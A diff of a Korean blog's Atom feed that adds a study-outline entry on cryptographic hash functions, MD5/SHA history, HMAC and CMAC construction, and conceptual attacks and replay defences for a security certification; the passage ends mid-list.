@@ -1,4 +1,505 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://bluesplatter.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://bluesplatter.com/" rel="alternate" type="text/html" /><updated>2021-11-19T17:56:23+09:00</updated><id>https://bluesplatter.com/feed.xml</id><title type="html">Bluesplatter</title><subtitle>전문적이지 않은 정보들, 감상, 즉흥적인 내용들</subtitle><author><name>HY03</name><email>hyunik03@gmail.com</email></author><entry><title type="html">정보보안 - 비대칭키 암호</title><link href="https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm/" rel="alternate" type="text/html" title="정보보안 - 비대칭키 암호" /><published>2021-08-25T09:00:00+09:00</published><updated>2021-08-25T09:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Management-AsymmetricKeyAlgorithm/">&lt;h1 id=&quot;비대칭키-암호&quot;&gt;비대칭키 암호&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://bluesplatter.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://bluesplatter.com/" rel="alternate" type="text/html" /><updated>2021-11-23T18:03:24+09:00</updated><id>https://bluesplatter.com/feed.xml</id><title type="html">Bluesplatter</title><subtitle>전문적이지 않은 정보들, 감상, 즉흥적인 내용들</subtitle><author><name>HY03</name><email>hyunik03@gmail.com</email></author><entry><title type="html">정보보안 - 해시함수</title><link href="https://bluesplatter.com/is_certification/IS-Management-HashAlgorithm/" rel="alternate" type="text/html" title="정보보안 - 해시함수" /><published>2021-11-23T09:00:00+09:00</published><updated>2021-11-23T09:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Management-HashAlgorithm</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Management-HashAlgorithm/">&lt;h1 id=&quot;해시함수&quot;&gt;해시함수&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;해시함수
+    &lt;ul&gt;
+      &lt;li&gt;일방향 해시함수
+        &lt;ul&gt;
+          &lt;li&gt;일방향 해시함수의 개요
+            &lt;ul&gt;
+              &lt;li&gt;기본개념
+                &lt;ul&gt;
+                  &lt;li&gt;일방향 해시함수(one-way hash function) 에는 입력과 출력이 각각 1개씩 있음&lt;/li&gt;
+                  &lt;li&gt;입력은 메시지(message) - 임의의 길이, 출력은 해시값(hash value) - 고정된 길이&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;일방향 해시함수의 성질
+            &lt;ul&gt;
+              &lt;li&gt;임의 길이의 메시지로부터 고정 길이의 해시값을 계산&lt;/li&gt;
+              &lt;li&gt;해시값을 고속으로 계산&lt;/li&gt;
+              &lt;li&gt;일방향성을 가짐. (해시값으로부터 메시지를 역산할 수 없음)&lt;/li&gt;
+              &lt;li&gt;메시지가 다르면 해시값도 다름. (무결성 확인용)
+                &lt;ul&gt;
+                  &lt;li&gt;메시지가 1비트라도 변하면 해시값은 매우 높은 확률로 다른 값이 되야 함.&lt;/li&gt;
+                  &lt;li&gt;2개의 다른 메시지가 같은 해시값을 갖는 것을 충돌(collision) 이라고 함.&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;충돌이 발생하는 것이 어려운 성질 =&amp;gt; 충돌 내성 (collision resistance)&lt;/li&gt;
+              &lt;li&gt;해시 함수 = 메시지 다이제스트 함수 = 메시지 요약함수&lt;/li&gt;
+              &lt;li&gt;무결성 = 완전성 = 보전성&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;메시지 무결성
+        &lt;ul&gt;
+          &lt;li&gt;무결성 점검
+            &lt;ul&gt;
+              &lt;li&gt;무결성 점검을 위해 암호학적 해시함수 사용&lt;/li&gt;
+              &lt;li&gt;생성된 메시지 다이제스트와 이전 메시지 다이제스트를 비교&lt;/li&gt;
+              &lt;li&gt;두 개가 동일하면 원래 메시지가 변경되지 않음&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;암호학적 해시함수 기준
+            &lt;ul&gt;
+              &lt;li&gt;개요 (암호학적 해시함수는 다음을 충족해야 함)
+                &lt;ul&gt;
+                  &lt;li&gt;프리이미지 저항성 (preimage resistance) : &lt;strong&gt;역상 저항성&lt;/strong&gt;
+                    &lt;ul&gt;
+                      &lt;li&gt;해시함수 h 와 y=h(M) 에 대하여 Eve 가 이를 만족하는 M 값을 찾아내는게 힘들어야 함&lt;/li&gt;
+                      &lt;li&gt;&lt;strong&gt;y = h(x) 를 만족하는 x 를 찾는 것이 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;제2프리이미지 저항성 (second preimage resistance) : 두 번째 역상 저항성, &lt;strong&gt;약한 충돌 내성&lt;/strong&gt;
+                    &lt;ul&gt;
+                      &lt;li&gt;메시지를 쉽게 위조할 수 없도록 하는 성질&lt;/li&gt;
+                      &lt;li&gt;Eve가 메시지와 다이제스트를 가로채고 또 다른 다이제스트를 생성&lt;/li&gt;
+                      &lt;li&gt;&lt;strong&gt;입력값 x에 대해서 h(x) = h(x’), x != x’ 을 만족하는 x’ 을 찾는 것이 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;충돌 저항성 (collision resistance) : &lt;strong&gt;강한 충돌 내성&lt;/strong&gt;
+                    &lt;ul&gt;
+                      &lt;li&gt;약한 충돌 내성보다 확률이 높음&lt;/li&gt;
+                      &lt;li&gt;Eve 로 하여금 동일한 다이제스트를 가지는 2개의 메시지를 구하지 못하도록 하는 것&lt;/li&gt;
+                      &lt;li&gt;&lt;strong&gt;h(x) = h(x’) 을 만족하는 입력값 x, x’ 을 찾는다는 것은 계산적으로 불가능해야 함.&lt;/strong&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;일방향 해시함수의 응용
+        &lt;ul&gt;
+          &lt;li&gt;소프트웨어 변경 검출&lt;/li&gt;
+          &lt;li&gt;무결성 검증&lt;/li&gt;
+          &lt;li&gt;패스워드를 기초로 한 암호화
+            &lt;ul&gt;
+              &lt;li&gt;패스워드와 솔트(의사난수 랜덤 값)를 섞은 결과의 해시값을 구해 그것을 암호화키로 사용 =&amp;gt; 사전 공격 차단&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;메시지 인증코드
+            &lt;ul&gt;
+              &lt;li&gt;송신자와 수신자만의 키와 메시지를 혼합하여 해시값을 계산 한 것&lt;/li&gt;
+              &lt;li&gt;SSL/TLS 에서도 사용&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;전자서명&lt;/li&gt;
+          &lt;li&gt;전자입찰 시스템&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;랜덤 오라클 모델과 해시함수에 대한 공격
+        &lt;ul&gt;
+          &lt;li&gt;랜덤 오라클 모델
+            &lt;ul&gt;
+              &lt;li&gt;개요
+                &lt;ul&gt;
+                  &lt;li&gt;해시함수에 대한 이상적인 수학적 모델&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;비둘기집 원리
+                &lt;ul&gt;
+                  &lt;li&gt;n+1 비들기가 n개의 집에 들어가 있을 때 한 비둘기 집에는 두마리가 있다는 원리 (충돌을 의미)&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;생일 문제 (생일 공격)
+                &lt;ul&gt;
+                  &lt;li&gt;같은 해시값을 생성하는 2개의 메시지를 구하는 것&lt;/li&gt;
+                  &lt;li&gt;강한 충돌 내성을 깨고자 하는 공격&lt;/li&gt;
+                  &lt;li&gt;생일 패러독스 (birthday paradox) -&amp;gt; 일치할 확률이 상상 이상으로 높아지는 것&lt;/li&gt;
+                  &lt;li&gt;랜덤으로 선택한 N명의 그룹, N 명 중 적어도 2명의 생일이 일치할 확률이 1/2 이상이 되도록 하기 위한 N은 최저 몇 명? -&amp;gt; 23명
+                    &lt;ul&gt;
+                      &lt;li&gt;N명 전원 생일이 일치하지 않을 확률을 1에서 빼면 됨.&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;일방향 해시함수에 대한 공격
+        &lt;ul&gt;
+          &lt;li&gt;무차별 공격
+            &lt;ul&gt;
+              &lt;li&gt;약한 충돌 내성을 깨고자 하는 공격&lt;/li&gt;
+              &lt;li&gt;SHA-1 은 160 비트라서 2의 160승 회를 시행하면 됨&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;기타 해시함수 공격의 종류 및 특성
+            &lt;ul&gt;
+              &lt;li&gt;일치블록 연쇄공격 : 새로운 메시지 M’ 을 사전에 다양하게 만들어 놓았다가 공격하고자 하는 메시지의 해시함수값 h(M) 과 같은 해시함수값을 갖는 것을 골라 사용하는 공격&lt;/li&gt;
+              &lt;li&gt;중간자 연쇄공격 : 전체 해시 값이 아니라 해시 중간의 결과에 대한 충돌쌍을 찾는다.&lt;/li&gt;
+              &lt;li&gt;고정점 연쇄공격 : 메시지 블록과 연쇄변수 쌍을 얻게 되면 임의의 수의 동등한 블록들 xi 를 메시지의 중간에 삽입해도 전체 해시값이 변하지 않는다.&lt;/li&gt;
+              &lt;li&gt;차분 연쇄공격
+                &lt;ul&gt;
+                  &lt;li&gt;다중 라운드 블록암호의 공격 = 다중 라운드 블록암호를 사용하는 해시 함수에서 입력값과 그에 대응하는 출력값 차이의 통계적 특성을 조사하는 기법&lt;/li&gt;
+                  &lt;li&gt;해시함수의 공격 : 압축함수의 입출력 차이를 조사하여 0의 충돌쌍을 주로 찾아내는 방법을 사용&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;일방향 해시함수로 해결할 수 없는 문제
+        &lt;ul&gt;
+          &lt;li&gt;조작과 변경을 검출할 수 있지만 거짓행세를 검출하지는 못함&lt;/li&gt;
+          &lt;li&gt;무결성 외에 인증이라는 절차도 필요 (파일의 무결성 뿐만 아니라 파일의 송신처 검증도 필요)
+            &lt;ul&gt;
+              &lt;li&gt;인증을 하기 위한 기술 : 메시지 인증코드와 전자서명과 같은 기술&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;암호학적 해시함수의 예
+    &lt;ul&gt;
+      &lt;li&gt;개요
+        &lt;ul&gt;
+          &lt;li&gt;압축함수의 두 가지 유형
+            &lt;ul&gt;
+              &lt;li&gt;기본 개념
+                &lt;ul&gt;
+                  &lt;li&gt;해시 함수를 설계하는 데에는 크게 서로 다른 2가지 경향이 있음.&lt;/li&gt;
+                  &lt;li&gt;압축함수를 아무런 기초 없이 처음부터 새로 만드는 것, 목적에 맞추어 특별하게 설계.&lt;/li&gt;
+                  &lt;li&gt;압축함수 자리에 대칭키 블록 암호를 사용하는 것.&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;새로 만드는 해시함수
+            &lt;ul&gt;
+              &lt;li&gt;메시지 다이제스트 (Message Digest) (MD2 -&amp;gt; MD4 -&amp;gt; MD5)
+                &lt;ul&gt;
+                  &lt;li&gt;MD 알고리즘에는 MD2, MD4, MD5 세 가지가 있음. RSA를 개발한 MIT의 Rivest 교수가 공개키 기반 구조를 만들기 위해 RSA 와 함께 개발&lt;/li&gt;
+                  &lt;li&gt;1989년에 만들어진 MD2는 8비트 컴퓨터에 최적화, MD4(90년 개발), MD5(91년 개발) 은 32비트 컴퓨터에 최적화&lt;/li&gt;
+                  &lt;li&gt;MD5 는 MD4의 확장판으로, MD4 보다 속도는 빠르지 않지만 데이터 보안성이 더 좋음.&lt;/li&gt;
+                  &lt;li&gt;최종 버전인 MD5 : 메시지를 512비트로 된 블록들로 나누고, 128비트 다이제스트를 출력. 충돌 공격 내성을 갖기에는 길이가 짧음.&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;SHA (Secure Hash Algorithm)
+                &lt;ul&gt;
+                  &lt;li&gt;안전 해시 알고리즘(SHA), 최근에 널리 사용&lt;/li&gt;
+                  &lt;li&gt;NIST가 개발, 1993년에 FIPS PUB 180 으로 출판. SHA의 약점이 발견되었을 때 1995년 FIPS PUB 180-1로 나옴, 이를 SHA-1 이라고 함.&lt;/li&gt;
+                  &lt;li&gt;SHA 는 MD4 해시함수에 기초, 설계도 MD4 를 모델로 함. MD5 보다 느리지만 안전함. SHA-1 해시값으로 160비트를 출력.&lt;/li&gt;
+                  &lt;li&gt;2002년 NIST는 새 표준인 FIPS-180-2를 내놓음. 해시 값이 각각 256, 384와 512비트인 3개의 새로운 SHA 버전을 정의함. SHA-256, SHA-384, SHA-512. 이들 알고리즘을 SHA-2 라고 함.&lt;/li&gt;
+                  &lt;li&gt;새로운 버전은 SHA-1과 하부구조가 동일. 동일한 유형의 모듈러 연산과 논리적 2진 연산을 이용. 2008년 FIP PUB 180-3 에는 224-비트 버전이 추가.&lt;/li&gt;
+                  &lt;li&gt;2005년에 SHA-1의 강한 충돌 내성이 깨졌다는 것을 접수하고 SHA-3을 제정하기로 함. SHA-3 은 AES와 같은 방식으로 표준화&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;SHA-512
+        &lt;ul&gt;
+          &lt;li&gt;개요
+            &lt;ul&gt;
+              &lt;li&gt;기본개념
+                &lt;ul&gt;
+                  &lt;li&gt;SHA-2에 포함 (SHA-224, SHA-256, SHA-384, SHA-512)&lt;/li&gt;
+                  &lt;li&gt;SHA-512는 다중-블록 메시지로부터 512비트 다이제스트를 생성함. 각 블록은 1024비트 길이를 가짐.&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;길이 필드와 패딩
+                &lt;ul&gt;
+                  &lt;li&gt;메시지 다이제스트를 생성하기 전에 메시지에 추가적으로 덧붙이는 128비트의 부호 없는 정수 길이 필드가 필요. (512의 경우)
+                    &lt;ul&gt;
+                      &lt;li&gt;
+                        &lt;table&gt;
+                          &lt;tbody&gt;
+                            &lt;tr&gt;
+                              &lt;td&gt;Original MSG Field (&amp;lt;2^128)&lt;/td&gt;
+                              &lt;td&gt;Padding Field (가변길이)&lt;/td&gt;
+                              &lt;td&gt;Length Field (Original MSG 길이필드 - Hash 값 수정에 대한 방어체계)&lt;/td&gt;
+                            &lt;/tr&gt;
+                          &lt;/tbody&gt;
+                        &lt;/table&gt;
+                      &lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;메시지의 길이가 비트수로 표현된 값이 저장됨. 이 길이는 패딩을 하기 전의 원래 메시지 길이를 나타냄.&lt;/li&gt;
+                  &lt;li&gt;부호 없는 128비트 정수 필드로 정의할 수 있는 수는 0부터 2^128-1 이다. 이 길이가 바로 SHA-512에서 감당할 수 있는 최대 메시지 길이.
+                    &lt;ul&gt;
+                      &lt;li&gt;2^128 비트 이하의 길이를 갖는 메시지를 1024비트의 블록으로 쪼갬.&lt;/li&gt;
+                      &lt;li&gt;IV 512 bit 와 블록을 Compression 함수를 이용해 512 bit 생성&lt;/li&gt;
+                      &lt;li&gt;위의 512bit 데이터를 다음 블록과 Compression 함수를 이용해 512 bit 생성…&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;메시지 인증코드(MAC)
+        &lt;ul&gt;
+          &lt;li&gt;MAC의 개요
+            &lt;ul&gt;
+              &lt;li&gt;기본개념
+                &lt;ul&gt;
+                  &lt;li&gt;메시지 인증을 위해 필요 (MAC, Message Authentication Code)&lt;/li&gt;
+                  &lt;li&gt;해시함수 기반, 블록암호 = 전자서명보다 속도가 빠름&lt;/li&gt;
+                  &lt;li&gt;무결성을 확인하고, 메시지에 대한 인증을 하는 기술 (변경과 거짓행세 검출 가능)&lt;/li&gt;
+                  &lt;li&gt;임의 길이의 메시지와 송신자 및 수신자가 공유하는 키라는 2개의 입력값을 기초로 해서 고정 비트길이의 출력을 계산하는 함수, 이 출력을 MAC 값이라고 부름.
+                    &lt;ul&gt;
+                      &lt;li&gt;Msg 와 키(송신자,수신자 공유)를 MAC 함수에 입력하여 MAC 값(고정길이 비트)을 추출&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;메시지 인증
+                &lt;ul&gt;
+                  &lt;li&gt;암호를 사용하면 소극적 공격(도청)을, 인증을 사용하면 적극적 공격(데이터나 거래의 위조)를 방어할 수 있음.&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;변경 감지 코드 (MDC, Modification Detection Code)
+            &lt;ul&gt;
+              &lt;li&gt;메시지의 무결성을 보장하는 메시지 다이제스트&lt;/li&gt;
+              &lt;li&gt;Bob은 수신한 메시지로부터 새로운 MDC 를 생성하여 Alice 에게 받은 MDC 와 비교, 값이 동일하다면 해당 메시지는 변경되지 않음.&lt;/li&gt;
+              &lt;li&gt;키가 없는 해시함수를 사용&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;메시지 인증 코드 (MAC)
+            &lt;ul&gt;
+              &lt;li&gt;메시지의 무결성은 물론 Alice 가 메시지의 원 전송자이며 다른 사람이 Alice 인 척 하는 것이 아니라는 것을 말해주는 데이터 출원지 인증을 보장하기 위해, 변경 감지 코드를 메시지 인증코드(MAC) 로 바꿀 필요가 있음.&lt;/li&gt;
+              &lt;li&gt;MDC와 MAC의 차이는 MAC 에는 Alice 와 Bob 사이의 비밀값이 포함. Eve 는 가지고 있지 않은 비밀키가 두 사람 사이의 비밀 값이 될 수 있다.
+                &lt;ul&gt;
+                  &lt;li&gt;Eve 가 변조를 하더라도, 메시지와 키 값의 Hash 값인 MAC 값을 생성할 수 없음.&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;MAC 의 키 배송 문제
+            &lt;ul&gt;
+              &lt;li&gt;MAC에서는 송신자와 수신자가 키를 공유할 필요가 있다.&lt;/li&gt;
+              &lt;li&gt;대칭키 암호 때의 키 배송 문제와 같은 문제가 메시지 인증코드에서도 일어남.&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;MAC의 구현 사례
+            &lt;ul&gt;
+              &lt;li&gt;축소 MAC
+                &lt;ul&gt;
+                  &lt;li&gt;MAC의 안정성을 높이기 위해 축소 MAC(nested MAC) 이 설계됨. 두 단계의 해싱이 있음&lt;/li&gt;
+                  &lt;li&gt;첫 번째 단계 : 키는 메시지와 이어 붙이고 해시하여 중간 단계의 다이제스트를 생성함.&lt;/li&gt;
+                  &lt;li&gt;두 번째 단계 : 키는 중간단계 다이제스트에 이어 붙이고 최종적인 다이제스트를 생성&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;HMAC
+                &lt;ul&gt;
+                  &lt;li&gt;축소 MAC 보다 더 복잡. 패딩 같은 추가적인 조치가 더 들어 있음.&lt;/li&gt;
+                  &lt;li&gt;HMAC 은 일방향 해시함수를 이용하여 메시지 인증코드를 구성하는 방법.&lt;/li&gt;
+                  &lt;li&gt;HMAC 의 H 는 Hash
+                    &lt;ul&gt;
+                      &lt;li&gt;블록길이
+                        &lt;ul&gt;
+                          &lt;li&gt;SHA-1 : 512&lt;/li&gt;
+                          &lt;li&gt;SHA-2 (SHA-224 : 512, SHA-256 : 512, SHA-384 : 1024, SHA-512 : 1024)&lt;/li&gt;
+                        &lt;/ul&gt;
+                      &lt;/li&gt;
+                      &lt;li&gt;MD 길이
+                        &lt;ul&gt;
+                          &lt;li&gt;SHA-1 : 160&lt;/li&gt;
+                          &lt;li&gt;SHA-2 (SHA-224 : 224, SHA-256 : 256, SHA-384 : 384, SHA-512 : 512)&lt;/li&gt;
+                        &lt;/ul&gt;
+                      &lt;/li&gt;
+                      &lt;li&gt;HMAC 과정
+                        &lt;ul&gt;
+                          &lt;li&gt;
+                            &lt;table&gt;
+                              &lt;tbody&gt;
+                                &lt;tr&gt;
+                                  &lt;td&gt;키값 : 키&lt;/td&gt;
+                                  &lt;td&gt;Key Padding (000..) 으로 블록길이만큼 늘임&lt;/td&gt;
+                                &lt;/tr&gt;
+                              &lt;/tbody&gt;
+                            &lt;/table&gt;
+                          &lt;/li&gt;
+                          &lt;li&gt;XOR 연산&lt;/li&gt;
+                          &lt;li&gt;I Pad : 00110110 00110110 00110110 … 으로 블록길이만큼 늘임&lt;/li&gt;
+                          &lt;li&gt;결과값 Si 와 메시지블록 M1, M2, … , Mn 을 결합하여 해시함수(H) 적용 (결과값 h)&lt;/li&gt;
+                          &lt;li&gt;위 키값과 O Pad : 01011100 01011100 01011100 … 으로 블록길이만큼 늘린 값을 XOR 연산&lt;/li&gt;
+                          &lt;li&gt;
+                            &lt;table&gt;
+                              &lt;tbody&gt;
+                                &lt;tr&gt;
+                                  &lt;td&gt;결과값 So 와 h 를 결합 (So&lt;/td&gt;
+                                  &lt;td&gt;h) 하여 해시함수(H) 적용, 최종 MAC 값 추출&lt;/td&gt;
+                                &lt;/tr&gt;
+                              &lt;/tbody&gt;
+                            &lt;/table&gt;
+                          &lt;/li&gt;
+                          &lt;li&gt;H : SHA-1, MD5 등등…&lt;/li&gt;
+                        &lt;/ul&gt;
+                      &lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;CMAC (Cipher-based Message Authentication Code)
+                &lt;ul&gt;
+                  &lt;li&gt;NIST 는 데이터 인증 알고리즘 혹은 CMAC 또는 CBCMAC 이라 부르는 표준 FIPS 113을 정의&lt;/li&gt;
+                  &lt;li&gt;대칭키 암호시스템에 대한 암호 블록체인 (CBC) 모드와 유사한 방법
+                    &lt;ul&gt;
+                      &lt;li&gt;그러나 N개의 평문 블록으로부터 N개의 암호문 블록을 만드는 것은 아님. (1개의 암호문 블록 생성)&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;CMAC 이 CBCMAC 보다 안전 (수학적 보완)&lt;/li&gt;
+                  &lt;li&gt;과정
+                    &lt;ul&gt;
+                      &lt;li&gt;메시지 블록 M1, M2, …, Mn&lt;/li&gt;
+                      &lt;li&gt;M1 과 k (키값) 을 E (Encrypt) 한 결과 R1&lt;/li&gt;
+                      &lt;li&gt;M2 와 R1 을 Xor 연산 하여 k (키값) 을 E (Encrypt) …&lt;/li&gt;
+                      &lt;li&gt;Mn 와 Rn-1 와 새로 생성한 k (키값) 을 E (Encrypt) =&amp;gt; CMAC&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;MAC 의 이용 예
+            &lt;ul&gt;
+              &lt;li&gt;IPSec (HMAC)
+                &lt;ul&gt;
+                  &lt;li&gt;인터넷 기반 통신프로토콜 IP(Internet Protocol) 에 보안기능을 추가한 것&lt;/li&gt;
+                  &lt;li&gt;통신 내용의 인증과 무결성을 확인하기 위해 MAC 을 이용&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;SSL/TLS (HMAC)
+                &lt;ul&gt;
+                  &lt;li&gt;웹에서 온라인 쇼핑을 할 때 사용되는 통신 프로토콜&lt;/li&gt;
+                  &lt;li&gt;통신 내용의 인증과 무결성 확인을 위해 메시지 인증코드를 이용&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;SET 프로토콜 (HMAC)&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;MAC 에 대한 공격
+            &lt;ul&gt;
+              &lt;li&gt;재전송 공격
+                &lt;ul&gt;
+                  &lt;li&gt;개요
+                    &lt;ul&gt;
+                      &lt;li&gt;적극적 공격자 멜로리는 자신이 보존해 둔 MAC 값을 반복해서 송신하는 공격을 감행.&lt;/li&gt;
+                      &lt;li&gt;이를 재전송 공격(replay attack) 이라고 부름
+                        &lt;ul&gt;
+                          &lt;li&gt;A 에서 B로 전송되는 Msg + MAC 을 Mellory 가 확보&lt;/li&gt;
+                          &lt;li&gt;Msg + MAC 을 재전송&lt;/li&gt;
+                        &lt;/ul&gt;
+                      &lt;/li&gt;
+                      &lt;li&gt;재전송 공격을 막을 수 있는 방법에는 아래 4가지가 있음.&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;순서 번호 (sequence number)
+                    &lt;ul&gt;
+                      &lt;li&gt;송신 메시지에 매회 1회씩 증가하는 번호를 붙이기로 약속.&lt;/li&gt;
+                      &lt;li&gt;MAC 값의 계산에 순서번호도 메시지에 포함시키도록 함.&lt;/li&gt;
+                      &lt;li&gt;마지막 순서 번호를 기록해야 함.&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;타임스탬프 (timestamp)
+                    &lt;ul&gt;
+                      &lt;li&gt;송신 메시지에 현재 시각을 넣기로 약속해두고 그 이전의 메시지가 왔을 경우에는 MAC 값이 바르더라도 오류라고 판단.&lt;/li&gt;
+                      &lt;li&gt;시계 동기화 필요&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;비표 (nonce)
+                    &lt;ul&gt;
+                      &lt;li&gt;메시지를 수신하기에 앞서 수신자는 송신자에게 일회용의 랜덤한 값 (비표) 를 줌.&lt;/li&gt;
+                      &lt;li&gt;송신자는 비표를 포함해서 MAC 값을 계산, 비표의 값은 통신 때마다 바뀜.&lt;/li&gt;
+                      &lt;li&gt;통신 데이터 양이 약간 증가&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                  &lt;li&gt;시도/응답 (challenge/response)
+                    &lt;ul&gt;
+                      &lt;li&gt;비표와 유사 개념&lt;/li&gt;
+                      &lt;li&gt;상대방에게 난수값을 보내면 상대방은 난수값을 포함한 응답값을 보내야 함.&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;MAC으로 해결할 수 없는 문제
+            &lt;ul&gt;
+              &lt;li&gt;제 3자에 대한 증명
+                &lt;ul&gt;
+                  &lt;li&gt;MAC 은 공유키를 사용하기에 MAC 값을 계산할 수 있는 것은 Alice 와 Bob 이다.&lt;/li&gt;
+                  &lt;li&gt;두 사람이 서로 통신하고 있는 동안 그 MAC 값을 계산한 것은 상대방이라고 말할 수 있다.&lt;/li&gt;
+                  &lt;li&gt;하지만 제3자 Victor 에게 이 MAC 값을 계산한 것은 자신이 아닌 상대방이라고 증명할 방법은 없다.
+                    &lt;ul&gt;
+                      &lt;li&gt;전자서명을 사용하면 제3자에 대한 증명이 가능해짐&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;부인 방지
+                &lt;ul&gt;
+                  &lt;li&gt;송신자 Alice 는 Bob 에게 그러한 메시지를 보내지 않았다고 Victor 에게 주장할 수 있고 이를 부인이라고 한다.&lt;/li&gt;
+                  &lt;li&gt;MAC 에서는 Alice 와 Bob 중 어느 쪽 주장이 맞는지를 판단할 수 없다.
+                    &lt;ul&gt;
+                      &lt;li&gt;전자서명을 사용하면 부인방지가 가능함&lt;/li&gt;
+                    &lt;/ul&gt;
+                  &lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;메시지 인증
+        &lt;ul&gt;
+          &lt;li&gt;개요
+            &lt;ul&gt;
+              &lt;li&gt;기본 개념
+                &lt;ul&gt;
